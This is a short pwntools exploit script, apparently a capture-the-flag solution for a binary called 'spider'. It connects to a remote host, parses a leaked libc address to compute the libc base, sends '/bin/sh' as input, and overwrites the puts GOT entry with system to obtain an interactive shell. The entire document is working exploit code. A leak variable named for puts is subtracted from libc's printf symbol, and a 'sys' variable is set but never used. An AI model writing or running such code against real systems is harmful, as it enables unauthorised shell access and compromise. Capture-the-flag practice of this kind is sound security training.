from pwn import *
elf = ELF('./spider')
libc = ELF('./libc.so.6')
p = remote('115.127.114.85',8007)
#p= elf.process()
#context.terminal = ['tmux', 'splitw', '-h'] 
context.log_level = 'debug'


ret = ROP(elf).find_gadget(['ret'])[0]
p.recvuntil(b'With great power comes great responsibility: 0x')
puts_leak = int(p.recv(12).strip().ljust(8,b'\x00'),16)
success(f"{hex(puts_leak)=}")

libc.address = puts_leak - libc.symbols.printf
success(f"{hex(libc.address)=}")
sys = libc.symbols.system+2
p.recvuntil(b'Enter Your Universe name: ')
p.send(b'/bin/sh')
p.recvuntil(b'proof? ')
over = elf.got.puts
p.send(str(over))  #address to be changed
p.recvuntil(b'how? ')
p.send(str(libc.symbols.system))

p.interactive()